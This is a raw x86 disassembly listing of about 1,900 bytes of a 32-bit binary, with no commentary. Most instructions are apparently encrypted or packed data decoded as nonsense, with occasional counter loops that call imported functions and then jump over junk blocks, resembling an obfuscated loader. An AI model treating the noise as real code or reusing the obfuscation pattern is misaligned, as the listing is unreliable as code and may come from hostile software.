  411fa2:	cmp    DWORD PTR [ecx],esp
  411fa4:	jmp    0x2ba6baf
  411fa9:	scas   al,BYTE PTR es:[edi]
  411faa:	pop    esi
  411fab:	sbb    DWORD PTR [esi+0x3069f159],ebx
  411fb1:	(bad)  
  411fb2:	mov    eax,0x45f0d396
  411fb7:	jmp    0x8395:0xe9baf16e
  411fbe:	jae    0x411f4e
  411fc0:	jl     0x411f9c
  411fc2:	imul   ebx,DWORD PTR [ebx-0x3e],0x38ed40e0
  411fc9:	in     eax,0x84
  411fcb:	mov    bh,0xba
  411fcd:	into   
  411fce:	push   ebx
  411fcf:	mov    BYTE PTR [edi],0x2f
  411fd2:	ror    DWORD PTR gs:[ebx+0x1afdffa2],1
  411fd9:	enter  0xd6f2,0xd5
  411fdd:	shr    BYTE PTR [ecx+ebx*8],0xcb
  411fe1:	test   cl,bl
  411fe3:	xchg   ecx,eax
  411fe4:	mov    bh,0x85
  411fe6:	pop    ds
  411fe7:	(bad)  
  411fe8:	lock shl BYTE PTR [ebx+0x3a],1
  411fec:	xchg   esp,eax
  411fed:	add    ebp,DWORD PTR ds:[ecx-0x326c8030]
  411ff4:	xchg   edi,ebx
  411ff6:	sbb    ch,dh
  411ff8:	sub    BYTE PTR [ebx-0x6f],ch
  411ffb:	mov    edi,0x6cda0bd2
  412000:	sbb    dl,BYTE PTR [edi+0x4a94551b]
  412006:	out    0x8,al
  412008:	out    dx,eax
  412009:	pusha  
  41200a:	bound  esp,QWORD PTR [ebx+ecx*2]
  41200d:	jno    0x412002
  41200f:	cs mov bh,0x57
  412012:	sbb    BYTE PTR [ecx-0x19417ae8],dh
  412018:	aad    0x90
  41201a:	and    bh,BYTE PTR ds:0x677f9a52
  412020:	or     ebp,DWORD PTR [ebp+esi*1-0x5221933d]
  412027:	(bad)  
  412029:	jl     0x4120a8
  41202b:	mov    al,0x80
  41202d:	push   ecx
  41202e:	shl    BYTE PTR [eax],0x6c
  412031:	sub    edi,DWORD PTR [edx-0x3f]
  412034:	out    0x88,al
  412036:	sbb    dl,cl
  412038:	mov    bh,0xe7
  41203a:	dec    eax
  41203b:	std    
  41203c:	lods   al,BYTE PTR ds:[esi]
  41203d:	lods   al,BYTE PTR ds:[esi]
  41203e:	js     0x412006
  412040:	jmp    0x412095
  412042:	aaa    
  412043:	push   ss
  412044:	add    edi,DWORD PTR [eax-0x6d79fa5e]
  41204a:	cmc    
  41204b:	mov    esp,0xe3f58481
  412050:	adc    esp,DWORD PTR [eax]
  412052:	div    ch
  412054:	mov    ebx,0x48483fbe
  412059:	cli    
  41205a:	mov    ch,0xef
  41205c:	sbb    al,0xfa
  41205e:	test   eax,0xc797d870
  412063:	dec    esi
  412064:	imul   esi,DWORD PTR [esi+ecx*8],0x2b
  412068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412069:	push   es
  41206a:	mov    eax,ebp
  41206c:	jmp    0xd7543ffb
  412071:	inc    esp
  412072:	cli    
  412073:	push   esp
  412074:	jge    0x4120c6
  412076:	add    BYTE PTR [ebx+edi*4-0x74],cl
  41207a:	std    
  41207b:	cmp    ecx,DWORD PTR [esi-0x3c934bb8]
  412081:	xchg   eax,edx
  412083:	jmp    0xc635:0xf8132f4d
  41208a:	fimul  DWORD PTR [eax]
  41208c:	or     dh,dl
  41208e:	inc    ebx
  41208f:	fst    DWORD PTR [edi]
  412091:	sbb    ch,BYTE PTR [eax-0x1e2771da]
  412097:	or     eax,0x4940ea1e
  41209c:	aad    0x5c
  41209e:	cmc    
  41209f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120a0:	add    ebx,ebp
  4120a2:	stc    
  4120a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120a4:	sub    DWORD PTR [edx-0x742a2a72],edx
  4120aa:	inc    ebp
  4120ab:	or     BYTE PTR [ebx+0x240d8b00],cl
  4120b1:	mov    dl,0x41
  4120b3:	add    BYTE PTR [ecx],al
  4120b5:	or     BYTE PTR [esi+0x5d],bl
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fe76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fdd5
  4120d3:	adc    DWORD PTR ds:0x42e7ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e7eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e803,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e7fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e7fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e7fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fe7e
  412121:	push   0x0
  412123:	push   0x42e36d
  412128:	call   DWORD PTR ds:0x42e583
  41212e:	mov    ebx,DWORD PTR ds:0x42e7fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e7fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e220,0x42fe01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	(bad)  
  41216e:	ins    DWORD PTR es:[edi],dx
  41216f:	mov    esi,0x705f462f
  412174:	jo     0x41212f
  412176:	jle    0x4121e8
  412178:	jo     0x412188
  41217a:	sub    BYTE PTR [ebx-0x29],ch
  41217d:	rol    al,cl
  41217f:	mov    edi,0x5a82d9cd
  412184:	mov    ecx,0x12b3e29d
  412189:	pop    ecx
  41218a:	cdq    
  41218b:	test   DWORD PTR [edx-0x19],0xc519428c
  412192:	mov    dh,0xaa
  412194:	aam    0xf
  412196:	dec    ecx
  412197:	mov    dl,0xce
  412199:	adc    DWORD PTR [eax+0x5014d8b9],edx
  41219f:	clc    
  4121a0:	les    edx,FWORD PTR [eax+0x6fbbc747]
  4121a6:	mov    ah,0x7c
  4121a8:	or     bh,dl
  4121aa:	adc    DWORD PTR [edi-0x1],eax
  4121ad:	pop    ebx
  4121ae:	test   ecx,edi
  4121b0:	mov    esp,0x3cd1148
  4121b5:	cdq    
  4121b6:	shr    BYTE PTR [ecx-0x5a4cfbd8],cl
  4121bc:	push   cs
  4121bd:	rcr    DWORD PTR [esi],cl
  4121bf:	dec    esi
  4121c0:	inc    ebx
  4121c1:	int    0x18
  4121c3:	ds xor eax,0x2fe9425b
  4121c9:	sbb    al,BYTE PTR [ecx+0x67]
  4121cc:	out    dx,al
  4121cd:	scas   al,BYTE PTR es:[edi]
  4121ce:	aaa    
  4121cf:	cmc    
  4121d0:	sahf   
  4121d1:	push   ecx
  4121d2:	mov    cl,0xac
  4121d4:	push   eax
  4121d5:	popf   
  4121d6:	sub    DWORD PTR [esi-0x4a],ebp
  4121d9:	popa   
  4121da:	jae    0x4121fc
  4121dc:	leave  
  4121dd:	ins    BYTE PTR es:[edi],dx
  4121de:	xor    dh,0x3e
  4121e1:	and    ah,BYTE PTR [edx]
  4121e3:	pop    ebx
  4121e4:	jge    0x41219e
  4121e6:	repnz or bl,dl
  4121e9:	xor    eax,ecx
  4121eb:	dec    esi
  4121ec:	inc    ebp
  4121ed:	adc    DWORD PTR [esi-0x1e],ebp
  4121f0:	jle    0x41221c
  4121f2:	ds stos DWORD PTR es:[edi],eax
  4121f4:	xor    eax,0xffd975e5
  4121f9:	sbb    esp,0x6e
  4121fc:	adc    esp,DWORD PTR [edi]
  4121fe:	test   eax,0xafae4cc8
  412203:	adc    DWORD PTR [eax+eiz*4],edx
  412206:	mov    eax,ds:0x50403dc0
  41220b:	inc    eax
  41220c:	cmc    
  41220d:	je     0x412248
  41220f:	xchg   ebp,eax
  412210:	mov    esp,0x12ac32
  412215:	(bad)  
  412216:	sbb    eax,0x130e365b
  41221b:	ja     0x412299
  41221d:	ror    DWORD PTR [ebx+eiz*4-0x6f],cl
  412221:	scas   eax,DWORD PTR es:[edi]
  412222:	dec    ecx
  412223:	(bad)  
  412224:	daa    
  412225:	and    BYTE PTR [edx-0x75],dl
  412228:	dec    edi
  412229:	mov    dh,0xff
  41222b:	add    ebx,DWORD PTR [ebx-0x558571aa]
  412231:	push   ss
  412232:	aaa    
  412233:	and    DWORD PTR [edi+ecx*1],0xea406f78
  41223a:	les    ebx,FWORD PTR [ebx]
  41223c:	lods   al,BYTE PTR ds:[esi]
  41223d:	lods   al,BYTE PTR ds:[esi]
  41223e:	rol    DWORD PTR [ebp-0x39],1
  412241:	mov    edi,0xb4bb1071
  412246:	lods   eax,DWORD PTR ds:[esi]
  412247:	push   ebx
  412248:	pop    ds
  412249:	mov    al,0x12
  41224b:	nop
  41224c:	(bad)  
  41224d:	bound  edx,QWORD PTR [edi+0x57]
  412250:	dec    edi
  412251:	mov    dh,ah
  412253:	dec    edi
  412254:	ss inc edi
  412256:	in     al,dx
  412257:	pop    eax
  412258:	jno    0x412222
  41225a:	test   BYTE PTR [esi+0x28517513],ah
  412260:	push   ss
  412261:	sub    dl,BYTE PTR [ebx+0x7e644b92]
  412267:	popa   
  412268:	or     esi,DWORD PTR ds:0x92e85ecf
  41226e:	adc    al,0xb5
  412270:	mov    dh,0x4f
  412272:	(bad)  
  412273:	fmul   st(0),st
  412275:	push   0x3937c026
  41227a:	xchg   esi,eax
  41227b:	test   DWORD PTR [ebx+0x7a2ea5f],esi
  412281:	jp     0x4122a4
  412283:	mov    ch,0x33
  412285:	jmp    0x452320bc
  41228a:	push   0xada6bc87
  41228f:	jle    0x4122ab
  412291:	(bad)  
  412292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412293:	popf   
  412294:	or     bh,BYTE PTR ds:[eax]
  412297:	add    BYTE PTR [ecx],0xe2
  41229a:	cmp    dl,BYTE PTR [edx]
  41229c:	sub    dl,BYTE PTR [edx]
  41229e:	cmc    
  41229f:	(bad)  
  4122a0:	adc    eax,0xbcfa2fdb
  4122a5:	dec    edx
  4122a6:	mov    esp,0x6ffbfb6f
  4122ab:	fimul  DWORD PTR [ecx-0x5a7dc7d4]
  4122b1:	and    DWORD PTR [ebp-0x27],ecx
  4122b4:	cld    
  4122b5:	or     bh,ch
  4122b7:	(bad)  [edi-0x11]
  4122ba:	dec    DWORD PTR [esi+0x1b35049]
  4122c0:	icebp  
  4122c1:	retf   
  4122c2:	pop    esp
  4122c3:	es mov ebp,ds
  4122c6:	lods   eax,DWORD PTR ds:[esi]
  4122c7:	pop    esp
  4122c8:	inc    ebx
  4122c9:	jo     0x412304
  4122cb:	inc    ecx
  4122cc:	mul    ah
  4122ce:	sti    
  4122cf:	xor    ah,BYTE PTR [ebx+0x462893b9]
  4122d5:	or     cl,BYTE PTR [edx]
  4122d7:	fmul   QWORD PTR [ebx]
  4122d9:	mov    bl,0xb2
  4122db:	fmul   DWORD PTR [edx+0xd173f25]
  4122e1:	jns    0x412270
  4122e3:	inc    edi
  4122e4:	xchg   esi,eax
  4122e5:	leave  
  4122e6:	ss mov edi,0xf6462557
  4122ec:	pop    ecx
  4122ed:	cwde   
  4122ee:	int3   
  4122ef:	xor    dl,BYTE PTR [ebx+ecx*2]
  4122f2:	std    
  4122f3:	or     al,0xe1
  4122f5:	or     esp,ebx
  4122f7:	and    cl,cl
  4122f9:	push   cs
  4122fa:	dec    esi
  4122fb:	enter  0x6106,0x75
  4122ff:	xor    esi,DWORD PTR [eax+0x5c]
  412302:	xor    ah,BYTE PTR [edi]
  412304:	or     DWORD PTR [ebx],ecx
  412306:	hlt    
  412307:	and    DWORD PTR ds:0x29ada15c,ebp
  41230d:	out    dx,eax
  41230e:	cmp    eax,DWORD PTR [esi-0x63]
  412311:	setb   BYTE PTR [ebp-0x19]
  412315:	rcr    BYTE PTR gs:[edx],0x90
  412319:	dec    esi
  41231a:	xchg   ebp,eax
  41231b:	add    DWORD PTR [si-0x69e],0xeba0019f
  412324:	sti    
  412325:	jle    0x4122f5
  412327:	pop    esi
  412328:	lahf   
  412329:	test   BYTE PTR [ebp+0x554b01e6],dh
  41232f:	pop    ss
  412330:	mov    ah,0x95
  412332:	mov    bh,BYTE PTR [eax]
  412334:	pop    edx
  412335:	ret    
  412336:	(bad)  
  412337:	shl    BYTE PTR [ebx-0x61e75d47],1
  41233d:	cmp    BYTE PTR [eax+0x5],cl
  412340:	adc    eax,0x91e3435a
  412345:	lods   eax,DWORD PTR ds:[esi]
  412346:	sti    
  412347:	add    dl,al
  412349:	sub    eax,0x2d13a92d
  41234e:	sbb    al,0x66
  412350:	and    BYTE PTR [edx+eiz*2-0x3e],ah
  412354:	pop    esi
  412355:	aam    0x1c
  412357:	jmp    0x4123c7
  412359:	or     ah,ah
  41235b:	jne    0x412393
  41235d:	sub    ah,BYTE PTR [edi+0xd5ad612]
  412363:	dec    ecx
  412364:	and    ah,BYTE PTR [edi+0x73d0f9e9]
  41236a:	retf   
  41236b:	xor    DWORD PTR [ebx+0x22f3dcba],esp
  412371:	popf   
  412372:	jne    0x4123c1
  412374:	jbe    0x4123f4
  412376:	and    eax,0xf2ff0c8b
  41237b:	ds es dec ecx
  41237e:	inc    esp
  41237f:	aaa    
  412380:	call   0xe384f52e
  412385:	out    0x6c,eax
  412387:	and    BYTE PTR [eax+0x65],cl
  41238a:	pop    esi
  41238b:	dec    edi
  41238c:	lds    edi,FWORD PTR [ebp-0xa]
  41238f:	hlt    
  412390:	adc    al,0x5a
  412392:	dec    ecx
  412393:	mov    ebp,0xdfc704ba
  412398:	pop    edx
  412399:	mov    esp,0xd62f7d7d
  41239e:	mov    bl,0x92
  4123a0:	pop    esi
  4123a1:	mov    cl,0xfc
  4123a3:	out    dx,eax
  4123a4:	(bad)  
  4123a5:	dec    ecx
  4123a6:	dec    esi
  4123a7:	neg    DWORD PTR [esi+0x6e]
  4123aa:	add    eax,0x46dd6d38
  4123af:	jecxz  0x4123bc
  4123b1:	inc    edx
  4123b2:	lods   al,BYTE PTR ds:[esi]
  4123b3:	push   es
  4123b4:	adc    DWORD PTR [ebx+edx*2+0x471de7f3],edi
  4123bb:	sar    BYTE PTR [ecx+0x17],0xf5
  4123bf:	out    dx,eax
  4123c0:	rcr    BYTE PTR [ecx+ebp*8],cl
  4123c3:	hlt    
  4123c4:	cmp    DWORD PTR [ebx-0x6d6662df],0x3a668cac
  4123ce:	sbb    bl,BYTE PTR [edx+0x1b96cef]
  4123d4:	mov    ch,0x57
  4123d6:	sub    ebp,ebx
  4123d8:	in     al,0xab
  4123da:	mov    dl,0x4c
  4123dc:	xlat   BYTE PTR ds:[ebx]
  4123dd:	lahf   
  4123de:	dec    ebx
  4123df:	jne    0x412413
  4123e1:	pop    esi
  4123e2:	bound  eax,QWORD PTR [ebp+eax*8+0x1]
  4123e6:	or     al,BYTE PTR [ebx-0x31]
  4123e9:	int3   
  4123ea:	sbb    al,0xb5
  4123ec:	xlat   BYTE PTR ds:[ebx]
  4123ed:	pop    ecx
  4123ee:	sbb    al,0x93
  4123f0:	jae    0x412385
  4123f2:	fnsave [eax]
  4123f4:	inc    eax
  4123f5:	ret    0x72ba
  4123f8:	xor    BYTE PTR [ecx+0xd999d84],bl
  4123fe:	dec    esi
  4123ff:	lods   al,BYTE PTR ds:[esi]
  412400:	imul   ecx,DWORD PTR [ebx-0x7f],0xffffff94
  412404:	sub    BYTE PTR [edx-0x8],al
  412407:	push   esi
  412408:	sbb    edx,DWORD PTR [ecx+edi*8-0x39]
  41240c:	jae    0x4123ef
  41240e:	pop    es
  41240f:	push   ds
  412410:	xchg   esp,eax
  412411:	into   
  412412:	pop    edx
  412413:	inc    esi
  412414:	jae    0x4123be
  412416:	(bad)  
  412418:	push   ss
  412419:	jb     0x4123a2
  41241b:	pop    esi
  41241c:	pushf  
  41241d:	repnz pop es
  41241f:	jmp    0xeb6c2e89
  412424:	xor    bh,BYTE PTR [edi+0xdc0e7c4]
  41242a:	daa    
  41242b:	mov    ebp,0xac33d42e
  412430:	loop   0x4123b5
  412432:	mov    ch,0x5e
  412434:	pop    ecx
  412435:	(bad)  
  412436:	mov    dl,0x36
  412438:	cmp    DWORD PTR [esi-0x4b9c5c45],esp
  41243e:	into   
  41243f:	add    eax,DWORD PTR [ebx]
  412441:	retf   
  412442:	sub    DWORD PTR ds:0x42fdf9,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	test   DWORD PTR [esp+eiz*8-0x61],ecx
  412461:	(bad)  
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0xf570707e
  41246a:	loopne 0x41249d
  41246c:	scas   eax,DWORD PTR es:[edi]
  41246d:	push   ecx
  41246e:	cdq    
  41246f:	dec    esi
  412470:	loopne 0x412486
  412472:	out    dx,al
  412473:	mov    cl,BYTE PTR [ecx-0x13]
  412476:	and    DWORD PTR [ebx-0x15],esi
  412479:	jns    0x41241c
  41247b:	rcl    BYTE PTR [ebx+0x3],cl
  41247e:	stos   DWORD PTR es:[edi],eax
  41247f:	mov    eax,0x709d9d22
  412484:	outs   dx,DWORD PTR ds:[esi]
  412485:	dec    eax
  412486:	int    0x96
  412488:	iret   
  412489:	out    0x58,al
  41248b:	icebp  
  41248c:	inc    ebp
  41248d:	inc    ecx
  41248e:	test   BYTE PTR [eax+0xbcd8e5c],dl
  412494:	push   es
  412495:	stos   DWORD PTR es:[edi],eax
  412496:	pop    es
  412497:	out    dx,al
  412498:	test   eax,0x76d7cdeb
  41249d:	sar    BYTE PTR [esi+0x205e672f],0x41
  4124a4:	mov    cl,0x91
  4124a6:	dec    ebx
  4124a7:	stc    
  4124a8:	(bad)  
  4124a9:	sub    BYTE PTR [eax],dl
  4124ab:	jbe    0x412509
  4124ad:	jno    0x4124bb
  4124af:	ret    0x58d5
  4124b2:	mov    bh,BYTE PTR [edx]
  4124b4:	cmc    
  4124b5:	or     ebp,DWORD PTR [edi-0x6f9781bb]
  4124bb:	stos   BYTE PTR es:[edi],al
  4124bc:	shl    DWORD PTR [eax+ebp*2],cl
  4124bf:	(bad)  
  4124c0:	pop    edx
  4124c1:	outs   dx,DWORD PTR ds:[esi]
  4124c2:	sbb    eax,0x666d9003
  4124c7:	cmp    BYTE PTR [edx-0x752ebeca],al
  4124cd:	or     DWORD PTR [ebx+0x5e],ebp
  4124d0:	adc    DWORD PTR [eax+eax*2+0x16],0x22271443
  4124d8:	push   cs
  4124d9:	sbb    ebx,DWORD PTR [eax+0x5f]
  4124dc:	pop    edx
  4124dd:	mov    es,ebx
  4124df:	push   ss
  4124e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124e1:	call   0x3ea0284d
  4124e6:	mov    ebp,0xdc7e39d6
  4124eb:	push   eax
  4124ec:	sub    eax,0xa9d009cb
  4124f1:	mov    ch,0x54
  4124f3:	mov    cl,0x4e
  4124f5:	adc    eax,0x9c95d0df
  4124fa:	push   0x42
  4124fc:	lahf   
  4124fd:	mov    dh,0x48
  4124ff:	daa    
  412500:	hlt    
  412501:	loop   0x4124a9
  412503:	jns    0x4124ea
  412505:	xchg   DWORD PTR [eax-0x4faa744a],edi
  41250b:	mov    ecx,0xe3068eb3
  412510:	xor    BYTE PTR [edi],dl
  412512:	fnsave [eax+0x48]
  412515:	and    BYTE PTR [ecx-0x38],dh
  412518:	imul   BYTE PTR ds:0xa23ceed7
  41251e:	push   ss
  41251f:	pop    eax
  412520:	inc    esp
  412521:	pop    ds
  412522:	call   0x717f:0xfc3e5663
  412529:	aam    0x93
  41252b:	jae    0x4124be
  41252d:	ss jno 0x4124e6
  412530:	push   ss
  412531:	(bad)  
  412532:	and    ecx,ebp
  412534:	pop    ss
  412535:	sbb    BYTE PTR [ebp*2+0x142a366a],0x53
  41253d:	sbb    eax,DWORD PTR [edi+0x5e]
  412540:	push   cs
  412541:	xlat   BYTE PTR es:[ebx]
  412543:	fwait
  412544:	imul   ebx,eax,0xc
  412547:	scas   al,BYTE PTR es:[edi]
  412548:	jae    0x41254f
  41254a:	sbb    DWORD PTR [ebx+0x77c0a120],ecx
  412550:	enter  0xb4f7,0xd2
  412554:	push   esi
  412555:	and    ebx,DWORD PTR [esi]
  412557:	rcl    DWORD PTR [ebx+0x3acae593],cl
  41255d:	outs   dx,BYTE PTR ds:[esi]
  41255e:	sbb    al,0xb3
  412560:	es fdivp st(4),st
  412563:	xor    edi,ebx
  412565:	push   ebx
  412566:	mov    ds:0xec707397,al
  41256b:	int3   
  41256c:	js     0x4125ae
  41256e:	mov    ah,0x28
  412570:	(bad)  
  412572:	fld    st(6)
  412574:	test   eax,0xca4a0f20
  412579:	outs   dx,DWORD PTR ds:[esi]
  41257a:	add    bl,ch
  41257c:	(bad)  
  41257d:	jg     0x41255b
  41257f:	aaa    
  412580:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412581:	sar    BYTE PTR [ebp+0x73d4cc6a],1
  412587:	(bad)  
  412588:	jno    0x412517
  41258a:	js     0x4125ca
  41258c:	call   0xf533:0x4ef8103a
  412593:	std    
  412594:	les    ecx,FWORD PTR [ebx-0x434c4900]
  41259a:	push   edi
  41259b:	sahf   
  41259c:	pop    ebp
  41259d:	imul   esi,DWORD PTR [edx-0x56],0x73d8488f
  4125a4:	scas   eax,DWORD PTR es:[edi]
  4125a5:	mov    ebx,ebp
  4125a7:	iret   
  4125a8:	stc    
  4125a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125aa:	(bad)  
  4125ab:	xchg   esi,eax
  4125ac:	ss xchg ebp,eax
  4125ae:	hlt    
  4125af:	push   ds
  4125b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125b1:	ror    dh,0x15
  4125b4:	pop    DWORD PTR [ebp-0x6f]
  4125b7:	xor    BYTE PTR [edi+0x226a065e],cl
  4125bd:	popa   
  4125be:	ret    
  4125bf:	adc    al,0xfc
  4125c1:	sub    BYTE PTR [eax],ah
  4125c3:	lock fwait
  4125c5:	inc    edx
  4125c6:	repz push ss
  4125c8:	mov    ebp,0x425cf26
  4125cd:	sbb    BYTE PTR [edi+ebx*4-0x14],dl
  4125d1:	std    
  4125d2:	ret    
  4125d3:	dec    edx
  4125d4:	cld    
  4125d5:	loope  0x4125f5
  4125d7:	jbe    0x4125c4
  4125d9:	xor    DWORD PTR [ecx+edx*4-0x64],ebp
  4125dd:	add    DWORD PTR [ebx-0x22],esi
  4125e0:	out    0xb,eax
  4125e2:	ror    DWORD PTR [edi+0x5b4d2cdb],1
  4125e8:	mov    bl,0x99
  4125ea:	je     0x4125a0
  4125ec:	es out 0xb8,eax
  4125ef:	mov    al,ds:0x4642a114
  4125f4:	pop    es
  4125f5:	loop   0x4125f9
  4125f7:	push   es
  4125f8:	enter  0x5738,0x49
  4125fc:	push   cs
  4125fd:	cmp    BYTE PTR [edx-0x31],0xc4
  412601:	nop
  412602:	sbb    eax,0x91d37a1c
  412607:	lock and eax,0x57e1b073
  41260d:	pop    edx
  41260e:	jnp    0x41264f
  412610:	int3   
  412611:	int3   
  412612:	push   edi
  412613:	pop    esp
  412614:	test   eax,0x2c5a432a
  412619:	add    ebx,0x2f
  41261c:	mov    edx,0xb234c883
  412621:	dec    edi
  412622:	ret    0xe442
  412625:	jl     0x412695
  412627:	lods   eax,DWORD PTR ds:[esi]
  412628:	mov    ecx,0xc6b775c3
  41262d:	mov    ecx,0xac524be3
  412632:	fisttp DWORD PTR [ebx-0x6d]
  412635:	mov    ds:0xcfad5159,eax
  41263a:	or     ch,BYTE PTR [edi-0x6633bef3]
  412640:	and    DWORD PTR [esi+ecx*2-0x377fb7e0],esi
  412647:	inc    esp
  412648:	mov    bh,0x56
  41264a:	lods   eax,DWORD PTR ds:[esi]
  41264b:	ins    BYTE PTR es:[edi],dx
  41264c:	mov    WORD PTR [eax],?
  41264e:	ins    BYTE PTR es:[edi],dx
  41264f:	bound  esp,QWORD PTR [ecx]
  412651:	(bad)  
  412652:	imul   ebp,DWORD PTR [esi],0x6ff68ea4
  412658:	iret   
  412659:	js     0x4126b3
  41265b:	pop    edi
  41265c:	cmp    edi,DWORD PTR [eax+esi*8]
  41265f:	pop    ebp
  412660:	seta   BYTE PTR [edi-0x4635d848]
  412667:	fld    TBYTE PTR [esi+0x73]
  41266a:	es enter 0xc5aa,0x13
  41266f:	jae    0x4126b7
  412671:	mov    ah,0x49
  412673:	mov    eax,0x48fdbfac
  412678:	retf   
  412679:	mov    eax,0x72c62bc4
  41267e:	mov    bh,0x59
  412680:	xor    cl,ch
  412682:	aam    0x8c
  412684:	(bad)  
  412685:	sbb    ecx,DWORD PTR [ebp+0x45514a7]
  41268b:	cdq    
  41268c:	jle    0x412680
  41268e:	push   eax
  41268f:	dec    esp
  412690:	cmp    eax,0x9bcccafc
  412695:	xchg   eax,edx
  412697:	push   ds
  412698:	dec    ebp
  412699:	pop    ebx
  41269a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41269b:	jecxz  0x4126a8
  41269d:	es push esi
  41269f:	test   DWORD PTR [eax-0x50],eax
  4126a2:	mov    edx,0x7aaa1b74
  4126a7:	(bad)  
  4126a8:	fisubr WORD PTR ds:0x4aefeaf2
  4126ae:	ds mov dh,0xc0
  4126b1:	sbb    BYTE PTR [eax+0x54],bh
  4126b4:	push   edi
  4126b5:	jmp    0xc829659f
  4126ba:	push   eax
  4126bb:	nop
  4126bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126bd:	(bad)  
  4126be:	in     al,0x6a
  4126c0:	mov    ebp,0x8569dc56
  4126c5:	lea    ecx,[ebx+ebx*1]
  4126c8:	jbe    0x4126ea
  4126ca:	push   cs
  4126cb:	scas   eax,DWORD PTR es:[edi]
  4126cc:	push   esi
  4126cd:	adc    bh,BYTE PTR [ebx]
  4126cf:	fimul  DWORD PTR [edx-0x55]
  4126d2:	push   ecx
  4126d3:	das    
  4126d4:	scas   eax,DWORD PTR es:[edi]
  4126d5:	mov    bl,0xb7
  4126d7:	mov    ds:0xe32a43bf,eax
  4126dc:	jge    0x412702
  4126de:	(bad)
  4126e1:	sbb    eax,0x25b8d39b
  4126e6:	push   ds
  4126e7:	int    0x9f
  4126e9:	push   edx
  4126ea:	dec    ebx
  4126eb:	jb     0x412734
  4126ed:	xor    eax,0x90671006
  4126f2:	fist   WORD PTR [edx+eiz*2]
  4126f5:	sub    al,0xc5
  4126f7:	jp     0x412767
  4126f9:	into   
  4126fa:	dec    edi
  4126fb:	dec    esp
  4126fc:	dec    ebx
  4126fd:	xor    DWORD PTR ds:0xf9259943,ecx
  412703:	jns    0x412767
  412705:	mov    dh,BYTE PTR [ecx-0x38394029]
  41270b:	sbb    eax,0xa4427f99
  412710:	adc    BYTE PTR [esi-0x5e2d9577],al
  412716:	and    DWORD PTR [ebp-0x44],ebp
  412719:	xchg   edi,eax
  41271a:	jmp    0x7f131e6f
  41271f:	jmp    DWORD PTR [ebx]
  412721:	in     al,dx
  412722:	mov    edi,0x101bc271
  412727:	dec    ebx
  412728:	mov    edi,DWORD PTR [edi]
  41272a:	push   0x29
  41272c:	shr    BYTE PTR [ecx-0x2b],0xd0
  412730:	mov    DWORD PTR [ebp-0x1c],ecx
  412733:	and    DWORD PTR ds:0x42fe76,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fe76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fe76,ecx
  412751:	cmp    DWORD PTR ds:0x42fe76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fe76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e413
  41277c:	cmp    DWORD PTR ds:0x42fe76,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fe76
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fe76,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fe6e,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    ebp,DWORD PTR [ebx-0x6b]
  4127bf:	sti    
  4127c0:	mov    cs,eax
  4127c2:	pop    ecx
  4127c3:	jo     0x412835
  4127c5:	mov    ecx,0xee70707e
  4127ca:	jns    0x412765
  4127cc:	(bad)  
  4127cd:	in     eax,dx
  4127ce:	(bad)  
  4127cf:	neg    bh
  4127d1:	test   al,0xe8
  4127d3:	push   ecx
  4127d4:	jbe    0x4127ab
  4127d6:	sbb    bh,BYTE PTR [ecx+ebp*8+0x28f8891e]
  4127dd:	mov    es,WORD PTR [eax+0x4c30481f]
  4127e3:	add    BYTE PTR [esi],0x5f
  4127e6:	call   0x87f7:0x24f51d82
  4127ed:	push   edx
  4127ee:	mov    bl,0xb9
